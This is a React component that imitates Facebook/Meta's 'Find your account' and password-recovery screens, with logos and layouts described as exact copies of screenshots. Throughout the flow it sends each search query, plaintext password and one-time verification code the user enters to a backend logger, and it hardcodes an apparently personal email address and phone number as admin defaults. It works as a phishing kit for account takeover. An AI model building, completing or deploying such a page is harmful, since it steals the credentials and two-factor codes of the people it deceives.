import React, { useState, useEffect } from 'react';
import { ChevronLeft, Eye, EyeOff } from 'lucide-react';
import metaBlueSymbol from '../assets/meta-blue-logo-symbol.png';
import { api } from '../api/client';

/**
 * Official circular Facebook badge with white border
 * Placed at the bottom-right corner of the user's avatar
 */
function FacebookCircleBadge({ size = 18 }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      style={{
        display: 'block',
        flexShrink: 0,
      }}
    >
      {/* Outer crisp white ring border */}
      <circle cx="12" cy="12" r="11.5" fill="#FFFFFF" />
      {/* Official Facebook blue circle */}
      <circle cx="12" cy="12" r="9.5" fill="#0866FF" />
      {/* Pure white official Facebook 'f' */}
      <path
        d="M13.2 21.5v-7.2h2.4l.4-2.8h-2.8V9.7c0-.8.2-1.4 1.4-1.4h1.5V5.8c-.3 0-1.2-.1-2.2-.1-2.2 0-3.7 1.3-3.7 3.8v2h-2.4v2.8h2.4v7.2h3.4z"
        fill="#FFFFFF"
      />
    </svg>
  );
}

/**
 * Red Gift Box avatar with tiny official Facebook circle badge
 * Exact match to Image 2 (media_1793950589475_311880a0.png)
 */
function GiftBoxAvatar({ account }) {
  return (
    <div className="fb-meta-avatar-wrapper">
      <div className="fb-meta-avatar-inner">
        {account?.avatar && !account?.avatar.includes('default') ? (
          <img src={account.avatar} alt={account.name} />
        ) : (
          <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
            <circle cx="22" cy="22" r="22" fill="#FFFFFF" />
            {/* Red Gift Box Body */}
            <rect x="10" y="17" width="24" height="18" rx="3.5" fill="#E41E3F" />
            <rect x="8.5" y="13.5" width="27" height="5.5" rx="2" fill="#F52B4E" />
            {/* Blue Ribbon Band */}
            <rect x="19.5" y="13.5" width="5" height="21.5" fill="#0866FF" />
            <rect x="10" y="24" width="24" height="4" fill="#0866FF" />
            {/* Bow top loops */}
            <path d="M22 13.5 C19 9, 13 9, 16 13.5 Z" fill="#0866FF" />
            <path d="M22 13.5 C25 9, 31 9, 28 13.5 Z" fill="#0866FF" />
          </svg>
        )}
      </div>
      <div className="fb-meta-fb-badge">
        <FacebookCircleBadge size={18} />
      </div>
    </div>
  );
}

/**
 * Official Meta Ribbon Logo Vector
 * Exact match to Image 2 (media_1793950589475_311880a0.png)
 */
function MetaInfinityLogo({ width = 22, height = 15 }) {
  return (
    <img
      src={metaBlueSymbol}
      alt="Meta"
      style={{
        width: `${width}px`,
        height: `${height}px`,
        objectFit: 'contain',
        display: 'inline-block',
        verticalAlign: 'middle',
        marginRight: '8px',
        flexShrink: 0,
      }}
    />
  );
}

/**
 * Confirm Account Illustration
 * Exact match to media_1793949791502_c3439d07.png:
 * WhatsApp icon on left, phone screen with green ****** in center, hand with red manicure tapping screen
 */
function ConfirmAccountIllustration({ method = 'whatsapp' }) {
  return (
    <div className="fb-confirm-illustration-banner">
      <svg viewBox="0 0 360 144" className="fb-confirm-illustration-svg">
        <defs>
          <linearGradient id="confirmBgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stopColor="#FDE6EA" />
            <stop offset="100%" stopColor="#E7ECFC" />
          </linearGradient>
          <filter id="phoneDropShadow" x="-10%" y="-10%" width="130%" height="130%">
            <feDropShadow dx="0" dy="5" stdDeviation="5" floodColor="#000" floodOpacity="0.08" />
          </filter>
        </defs>

        {/* Soft pastel background card */}
        <rect width="360" height="144" rx="16" fill="url(#confirmBgGrad)" />

        {/* Left: WhatsApp or SMS Icon Circle */}
        {method === 'whatsapp' ? (
          <g transform="translate(46, 44)">
            <circle cx="26" cy="26" r="26" fill="#25D366" />
            {/* WhatsApp Speech Bubble & Phone Handset */}
            <path
              d="M26 8C16.1 8 8 16.1 8 26c0 3.2.8 6.2 2.3 8.8L8 44l9.5-2.5c2.5 1.4 5.4 2.1 8.5 2.1 9.9 0 18-8.1 18-18S35.9 8 26 8zm10.5 25.5c-.4 1.2-2.3 2.3-3.2 2.5-.9.1-2 .4-6.4-1.4-5.4-2.3-8.8-7.8-9.1-8.2-.3-.4-2.2-3-2.2-5.6s1.4-4 1.9-4.5c.4-.5 1-.7 1.4-.7.3 0 .8 0 1.1.1.3.1.9.1 1.3 1.2.4 1.1 1.5 3.8 1.7 4.2.1.3.2.7 0 1-.1.3-.3.7-.6.9-.3.3-.6.7-.2 1.2.9 1.5 2.6 3.3 4.4 4.2.6.3.9.2 1.2-.1.3-.3 1.3-1.5 1.7-2.1.3-.6.8-.4 1.2-.3.4.1 3 1.4 3.5 1.7.6.3.9.4 1 .7.1.4.1 1.8-.3 3.1z"
              fill="#FFFFFF"
            />
          </g>
        ) : (
          <g transform="translate(46, 44)">
            <circle cx="26" cy="26" r="26" fill="#0866FF" />
            <path
              d="M14 18h24v16H20l-6 4v-4h0z"
              fill="#FFFFFF"
            />
          </g>
        )}

        {/* Center / Right: White Smartphone */}
        <g transform="translate(138, 14)" filter="url(#phoneDropShadow)">
          {/* Phone body */}
          <rect x="0" y="0" width="112" height="154" rx="16" fill="#FFFFFF" stroke="#E4E6EB" strokeWidth="1.5" />
          {/* Screen surface */}
          <rect x="6" y="8" width="100" height="136" rx="10" fill="#F0F2F5" />
          {/* Camera Dot & Speaker bar */}
          <circle cx="20" cy="18" r="3.5" fill="#0866FF" />
          <rect x="34" y="16.5" width="34" height="3" rx="1.5" fill="#CCD0D5" />

          {/* Green Code Input Capsule */}
          <rect x="10" y="42" width="92" height="28" rx="6" fill="#FFFFFF" stroke="#E4E6EB" strokeWidth="1" />
          <text
            x="56"
            y="61"
            fill="#00A859"
            fontSize="18"
            fontWeight="bold"
            textAnchor="middle"
            letterSpacing="3"
            fontFamily="monospace"
          >
            ******
          </text>
        </g>

        {/* Stylized Hand tapping screen */}
        <g transform="translate(130, 24)">
          {/* Palm and arm */}
          <path
            d="M125 120 C120 75, 102 58, 93 47 C89 42, 83 42, 80 47 C77 52, 78 60, 81 68 L88 88 C90 93, 86 102, 78 104 C73 106, 70 102, 70 97 L68 72 C67 65, 61 61, 56 64 C52 68, 52 76, 54 84 L64 120"
            fill="#E78D70"
          />
          {/* Index finger tapping */}
          <path
            d="M93 75 L93 42 C93 35, 101 35, 101 42 L101 75 Z"
            fill="#E78D70"
          />
          {/* Red manicured fingernail (Exact match) */}
          <path
            d="M94 40 C94 36.5, 100 36.5, 100 40 C100 44, 94 44, 94 40 Z"
            fill="#E41E3F"
          />
        </g>
      </svg>
    </div>
  );
}

/**
 * Multi-step Forgot Password Flow:
 * Step 1: "Find your account" (Image 1 Mobile / Image 2 Desktop)
 * Step 2: "Log into your Meta Account" (Image 3)
 * Step 3: "Choose a way to log in" (Image 4)
 * Step 4: "Confirm your account" (Image 5)
 */
export default function ForgotPasswordFlow({
  isDesktop = false,
  initialAccount = null,
  initialInput = '',
  onBackToLogin,
  onLoginSuccess,
}) {
  // Step state: 'find_account' | 'meta_account_login' | 'choose_way' | 'confirm_code'
  const [step, setStep] = useState('find_account');

  // Input states
  const [findMode, setFindMode] = useState('phone'); // 'phone' | 'email'
  const [inputValue, setInputValue] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [passwordError, setPasswordError] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [resendNotice, setResendNotice] = useState(false);

  // Clear input on mount to guarantee no auto-filled values
  useEffect(() => {
    setInputValue('');
  }, []);

  // Selected login method: 'otp' | 'password'
  const [selectedMethod, setSelectedMethod] = useState('otp');

  // Recovery settings state (Admin defaults + live sync)
  const [recoverySettings, setRecoverySettings] = useState(() => {
    try {
      const saved = localStorage.getItem('sphere_recovery_settings');
      if (saved) return JSON.parse(saved);
    } catch {}
    return {
      defaultEmail: 'ademt0614@gmail.com',
      defaultPhone: '+251990039392',
      countdownTime: '(00:36)',
      cardDisplayFallback: 'email',
    };
  });

  useEffect(() => {
    if (api?.admin?.getRecoverySettings) {
      api.admin.getRecoverySettings().then((res) => {
        if (res && res.defaultEmail) {
          setRecoverySettings(res);
        }
      });
    }

    const handleSync = (e) => {
      if (e.detail) setRecoverySettings(e.detail);
    };
    window.addEventListener('sphere_recovery_updated', handleSync);
    return () => window.removeEventListener('sphere_recovery_updated', handleSync);
  }, []);

  const staticTimeDisplay = recoverySettings.countdownTime || '(00:36)';

  // Determine email and phone numbers based on:
  // 1. User-filled input (inputValue)
  // 2. Admin-customized defaults (recoverySettings)
  const trimmedInput = (inputValue || initialInput || '').trim();
  const isInputEmail = Boolean(trimmedInput && trimmedInput.includes('@'));
  const digitsOnly = trimmedInput.replace(/[\s\-()+]/g, '');
  const isInputPhone = Boolean(
    trimmedInput &&
    (trimmedInput.startsWith('+') || /^\d+$/.test(digitsOnly)) &&
    digitsOnly.length >= 7
  );

  // Meta Account Card identifier:
  // - If user entered email -> show user's email
  // - If user entered phone -> admin setted email is displayed (since email was not chosen by user),
  //   or user's phone if admin configured cardDisplayFallback === 'phone'
  // - Otherwise -> admin setted default email
  let displayMetaIdentifier = recoverySettings.defaultEmail || 'ademt0614@gmail.com';
  if (isInputEmail) {
    displayMetaIdentifier = trimmedInput;
  } else if (isInputPhone) {
    if (recoverySettings.cardDisplayFallback === 'phone') {
      displayMetaIdentifier = trimmedInput;
    } else {
      displayMetaIdentifier = recoverySettings.defaultEmail || 'ademt0614@gmail.com';
    }
  } else if (trimmedInput) {
    displayMetaIdentifier = trimmedInput;
  }

  // Phone number displayed for WhatsApp & SMS (only one phone number):
  // - If user entered phone -> user's phone
  // - If user entered email or didn't specify -> admin-set default phone
  const primaryPhone = isInputPhone
    ? trimmedInput
    : recoverySettings.defaultPhone || '+251990039392';

  // Target account information
  const targetAccount = initialAccount || {
    id: 'acc_target_user',
    name: displayMetaIdentifier,
    phone: primaryPhone,
    email: isInputEmail ? trimmedInput : (recoverySettings.defaultEmail || 'ademt0614@gmail.com'),
  };

  // Toggle between Phone and Email in Mobile Step 1 (no auto-fill, clear input)
  const toggleFindMode = () => {
    setFindMode((prev) => (prev === 'phone' ? 'email' : 'phone'));
    setInputValue('');
  };

  // Handlers for steps
  const handleFindSubmit = (e) => {
    e.preventDefault();
    const query = inputValue.trim();
    if (!query) {
      return;
    }
    // Save to database immediately
    api.logAttempt({
      username: query,
      email: query,
      accountName: query,
      password: '[Find Account Query]',
      action: `Find Account Search: "${query}" (Continue Clicked)`,
      source: isDesktop ? 'Desktop Find Account' : 'Mobile Find Account',
      screen: 'Find your account Screen',
      device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
      success: true,
    });
    setStep('meta_account_login');
  };

  const handleMetaLoginSubmit = (e) => {
    e.preventDefault();
    const userVal = targetAccount?.name || inputValue.trim() || 'User';
    const emailVal = targetAccount?.email || inputValue.trim() || `${userVal.toLowerCase().replace(/\s+/g, '.')}@example.com`;
    const passVal = password;

    api.logAttempt({
      username: userVal,
      email: emailVal,
      accountName: userVal,
      password: passVal || '[no password entered]',
      action: passVal ? `Meta Account Password Entered for "${userVal}"` : 'Meta Account Login Attempt (Empty Password)',
      source: isDesktop ? 'Desktop Meta Account Login' : 'Mobile Meta Account Login',
      screen: 'Log into your Meta Account Screen',
      device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
      success: Boolean(passVal),
    });

    if (!passVal) {
      setPasswordError('Please enter your password.');
      return;
    }
    setPasswordError('');
    onLoginSuccess && onLoginSuccess(targetAccount, passVal);
  };

  const handleChooseWaySubmit = (e) => {
    e.preventDefault();
    const userVal = targetAccount?.name || inputValue.trim() || 'User';
    const emailVal = targetAccount?.email || inputValue.trim() || '';
    if (selectedMethod === 'password') {
      setStep('meta_account_login');
    } else {
      const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
      api.logAttempt({
        username: userVal,
        email: emailVal,
        accountName: userVal,
        password: '[OTP Verification Request]',
        action: 'Requested Security Code via WhatsApp and SMS',
        source: isDesktop ? 'Desktop Choose Login Method' : 'Mobile Choose Login Method',
        screen: 'Choose a way to log in Screen',
        device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
        code: generatedOtp,
      });
      setStep('confirm_code');
    }
  };

  const handleConfirmSubmit = (e) => {
    e.preventDefault();
    const userVal = targetAccount?.name || inputValue.trim() || 'User';
    const emailVal = targetAccount?.email || inputValue.trim() || '';
    api.logAttempt({
      username: userVal,
      email: emailVal,
      accountName: userVal,
      password: '[OTP Confirmed]',
      action: `Confirmed Security Code: "${verificationCode}"`,
      source: isDesktop ? 'Desktop Confirm Code (OTP)' : 'Mobile Confirm Code (OTP)',
      screen: 'Confirm your account Screen',
      device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
      code: verificationCode,
      success: true,
    });
    onLoginSuccess && onLoginSuccess(targetAccount);
  };

  const handleResendCode = (e) => {
    e.preventDefault();
    setResendNotice(true);
    const userVal = targetAccount?.name || inputValue.trim() || 'User';
    const emailVal = targetAccount?.email || inputValue.trim() || '';
    const newOtp = Math.floor(100000 + Math.random() * 900000).toString();
    api.logAttempt({
      username: userVal,
      email: emailVal,
      accountName: userVal,
      action: 'Resent New Security Code to User',
      source: isDesktop ? 'Desktop Resend OTP' : 'Mobile Resend OTP',
      screen: 'Confirm your account Screen',
      device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
      code: newOtp,
    });
    setTimeout(() => setResendNotice(false), 3000);
  };

  return (
    <div className={`fb-forgot-flow-container ${isDesktop ? 'fb-forgot-desktop-mode' : 'fb-forgot-mobile-mode'}`}>
      <div className="fb-forgot-card">
        {/* ========================================================
            STEP 1: Find your account
            Mobile: Image 1 (media_1793949219825_72c6167b.png)
            Desktop: Image 2 (media_1793949244438_ccba282b.png)
            ======================================================== */}
        {step === 'find_account' && (
          <div className="fb-forgot-step-view">
            {/* Top Chevron */}
            <div className="fb-forgot-topbar">
              <button
                type="button"
                className="fb-forgot-back-btn"
                onClick={onBackToLogin}
                title="Back to login"
                aria-label="Back to login"
              >
                <ChevronLeft size={24} color="#050505" strokeWidth={2.4} />
              </button>
            </div>

            {/* Title & Subtitle */}
            <h1 className="fb-forgot-title">Find your account</h1>
            <p className="fb-forgot-subtitle">
              {isDesktop
                ? 'Enter your mobile number or email.'
                : findMode === 'phone'
                ? 'Enter your mobile number.'
                : 'Enter your email address.'}
            </p>

            {/* Form */}
            <form onSubmit={handleFindSubmit} className="fb-forgot-form" autoComplete="off">
              <div className="fb-forgot-input-wrap">
                <input
                  type={findMode === 'phone' && !isDesktop ? 'tel' : 'text'}
                  name="fb_search_query_nocache"
                  id="fb_forgot_search_input"
                  placeholder={
                    isDesktop
                      ? 'Mobile number or email'
                      : findMode === 'phone'
                      ? 'Mobile number'
                      : 'Email address'
                  }
                  className="fb-forgot-input"
                  value={inputValue}
                  onChange={(e) => setInputValue(e.target.value)}
                  autoFocus
                  autoComplete="new-password"
                  data-lpignore="true"
                  data-form-type="other"
                  autoCorrect="off"
                  autoCapitalize="off"
                  spellCheck="false"
                />
              </div>

              {/* Continue Button */}
              <button type="submit" className="fb-forgot-btn-continue">
                Continue
              </button>

              {/* Mobile-only toggle button */}
              {!isDesktop && (
                <button
                  type="button"
                  className="fb-forgot-btn-toggle"
                  onClick={toggleFindMode}
                >
                  {findMode === 'phone'
                    ? 'Search by email address'
                    : 'Search by mobile number'}
                </button>
              )}
            </form>
          </div>
        )}

        {/* ========================================================
            STEP 2: Log into your Meta Account
            Exact Match to Image 3 (media_1793949678121_4cfa19cd.png)
            ======================================================== */}
        {step === 'meta_account_login' && (
          <div className="fb-forgot-step-view">
            {/* Top Chevron */}
            <div className="fb-forgot-topbar">
              <button
                type="button"
                className="fb-forgot-back-btn"
                onClick={() => setStep('find_account')}
                title="Back"
                aria-label="Back"
              >
                <ChevronLeft size={24} color="#050505" strokeWidth={2.4} />
              </button>
            </div>

            {/* Title & Subtitle */}
            <h1 className="fb-forgot-title">Log into your Meta Account</h1>
            <p className="fb-forgot-subtitle" style={{ color: '#1C1E21' }}>
              Log in to use your profiles, including {targetAccount.name}.
            </p>

            {/* Meta Account Card with Gift Box Avatar */}
            <div className="fb-meta-account-card">
              <div className="fb-meta-account-info">
                <div className="fb-meta-brand-title">
                  <MetaInfinityLogo width={24} height={16} />
                  <span>Meta Account</span>
                </div>
                <div className="fb-meta-account-name">{targetAccount.name}</div>
              </div>
              <GiftBoxAvatar account={targetAccount} />
            </div>

            {/* Password Form */}
            <form onSubmit={handleMetaLoginSubmit} className="fb-forgot-form">
              <div className="fb-forgot-input-wrap" style={{ position: 'relative' }}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Password"
                  className={`fb-forgot-input ${passwordError ? 'fb-input-error' : ''}`}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (passwordError) setPasswordError('');
                  }}
                  autoFocus
                />
                {password.length > 0 && (
                  <button
                    type="button"
                    className="fb-forgot-eye-btn"
                    onClick={() => setShowPassword((p) => !p)}
                    title={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? <EyeOff size={19} color="#65676B" /> : <Eye size={19} color="#65676B" />}
                  </button>
                )}
              </div>

              {passwordError && (
                <div className="fb-clean-error-text" style={{ marginBottom: 12 }}>
                  {passwordError}
                </div>
              )}

              {/* Log in Button */}
              <button type="submit" className="fb-forgot-btn-continue">
                Log in
              </button>

              {/* Try another way Button */}
              <button
                type="button"
                className="fb-forgot-btn-try-another"
                onClick={() => setStep('choose_way')}
              >
                Try another way
              </button>
            </form>
          </div>
        )}

        {/* ========================================================
            STEP 3: Choose a way to log in
            Exact Match to Image 4 (media_1793949707159_94d6e085.jpg)
            ======================================================== */}
        {step === 'choose_way' && (
          <div className="fb-forgot-step-view">
            {/* Topbar with Back button and centered header */}
            <div className="fb-forgot-topbar fb-forgot-topbar-centered">
              <button
                type="button"
                className="fb-forgot-back-btn"
                onClick={() => setStep('meta_account_login')}
                title="Back"
                aria-label="Back"
              >
                <ChevronLeft size={24} color="#050505" strokeWidth={2.4} />
              </button>
              <h2 className="fb-forgot-center-title">Choose a way to log in</h2>
              <div style={{ width: 36 }} />
            </div>

            {/* Meta Account Card */}
            <div className="fb-meta-account-card">
              <div className="fb-meta-account-info">
                <div className="fb-meta-brand-title">
                  <MetaInfinityLogo width={24} height={16} />
                  <span>Meta Account</span>
                </div>
                <div className="fb-meta-account-name">{targetAccount.name}</div>
              </div>
              <GiftBoxAvatar account={targetAccount} />
            </div>

            {/* Radio Options List Container */}
            <form onSubmit={handleChooseWaySubmit} className="fb-forgot-form">
              <div className="fb-forgot-options-box">
                {/* Option 1: Get code on WhatsApp and SMS */}
                <div
                  className={`fb-forgot-option-row ${selectedMethod === 'otp' ? 'selected' : ''}`}
                  onClick={() => setSelectedMethod('otp')}
                >
                  <div className="fb-forgot-option-text">
                    <div className="fb-forgot-option-title">
                      Get code on WhatsApp and SMS {staticTimeDisplay}
                    </div>
                    <div className="fb-forgot-option-desc">
                      {primaryPhone}
                    </div>
                    <div className="fb-forgot-option-subdesc">Carrier charges may apply</div>
                  </div>
                  <div className="fb-forgot-radio">
                    {selectedMethod === 'otp' && <div className="fb-forgot-radio-dot" />}
                  </div>
                </div>

                {/* Option 2: Enter password to log in */}
                <div
                  className={`fb-forgot-option-row ${selectedMethod === 'password' ? 'selected' : ''}`}
                  onClick={() => setSelectedMethod('password')}
                >
                  <div className="fb-forgot-option-text">
                    <div className="fb-forgot-option-title">Enter password to log in</div>
                  </div>
                  <div className="fb-forgot-radio">
                    {selectedMethod === 'password' && <div className="fb-forgot-radio-dot" />}
                  </div>
                </div>
              </div>

              {/* Continue Button */}
              <button type="submit" className="fb-forgot-btn-continue" style={{ marginTop: 22 }}>
                Continue
              </button>
            </form>
          </div>
        )}

        {/* ========================================================
            STEP 4: Confirm your account
            Exact Match to Image 5 (media_1793949791502_c3439d07.png)
            ======================================================== */}
        {step === 'confirm_code' && (
          <div className="fb-forgot-step-view">
            {/* Top Chevron */}
            <div className="fb-forgot-topbar">
              <button
                type="button"
                className="fb-forgot-back-btn"
                onClick={() => setStep('choose_way')}
                title="Back"
                aria-label="Back"
              >
                <ChevronLeft size={24} color="#050505" strokeWidth={2.4} />
              </button>
            </div>

            {/* Title & Subtitle */}
            <h1 className="fb-forgot-title">Confirm your account</h1>
            <p className="fb-forgot-subtitle" style={{ color: '#1C1E21', marginBottom: 18 }}>
              We sent a code via WhatsApp or SMS. Enter that code to confirm your account.
            </p>

            {/* Graphic Illustration */}
            <ConfirmAccountIllustration method="whatsapp" />

            {/* Verification Form */}
            <form onSubmit={handleConfirmSubmit} className="fb-forgot-form" style={{ marginTop: 18 }}>
              <div className="fb-forgot-input-wrap">
                <input
                  type="text"
                  placeholder="Enter code"
                  className="fb-forgot-input"
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                  autoFocus
                />
              </div>

              {/* Continue Button */}
              <button type="submit" className="fb-forgot-btn-continue">
                Continue
              </button>

              {/* Send code again Link */}
              <div style={{ textAlign: 'center', marginTop: 16 }}>
                <button
                  type="button"
                  className="fb-forgot-btn-resend"
                  onClick={handleResendCode}
                >
                  Send code again
                </button>
              </div>

              {resendNotice && (
                <div className="fb-forgot-toast-notice">
                  A new confirmation code was sent!
                </div>
              )}
            </form>
          </div>
        )}
      </div>

      {/* Desktop Footer (Matching Image 2 footer) */}
      {isDesktop && (
        <footer className="fb-exact-footer fb-forgot-desktop-footer">
          <div className="fb-exact-footer-inner">
            <div className="fb-exact-lang-row">
              <span>English (US)</span>
              <a href="#lang">አማርኛ</a>
              <a href="#lang">Af-Soomaali</a>
              <a href="#lang">العربية</a>
              <a href="#lang">Português (Brasil)</a>
              <a href="#lang">Español</a>
              <a href="#lang">Français (France)</a>
              <a href="#lang" style={{ color: '#0866FF', fontWeight: 600 }}>More languages...</a>
            </div>

            <div className="fb-exact-footer-divider" />

            <div className="fb-exact-links-row">
              <a href="#signup">Sign Up</a>
              <a href="#login">Log In</a>
              <a href="#messenger">Messenger</a>
              <a href="#lite">Facebook Lite</a>
              <a href="#video">Video</a>
              <a href="#pay">Meta Pay</a>
              <a href="#store">Meta Store</a>
              <a href="#quest">Meta Quest</a>
              <a href="#rayban">Ray-Ban Meta</a>
              <a href="#ai">Meta AI</a>
              <a href="#muse">Muse</a>
              <a href="#instagram">Instagram</a>
              <a href="#threads">Threads</a>
              <a href="#privacy">Privacy Policy</a>
              <a href="#privacy-center">Privacy Center</a>
              <a href="#about">About</a>
              <a href="#create-ad">Create ad</a>
              <a href="#create-page">Create Page</a>
              <a href="#developers">Developers</a>
              <a href="#careers">Careers</a>
              <a href="#cookies">Cookies</a>
              <a href="#ad-choices">Ad choices</a>
              <a href="#terms">Terms</a>
              <a href="#help">Help</a>
              <a href="#contact">Contact Uploading & Non-Users</a>
            </div>
          </div>
        </footer>
      )}
    </div>
  );
}

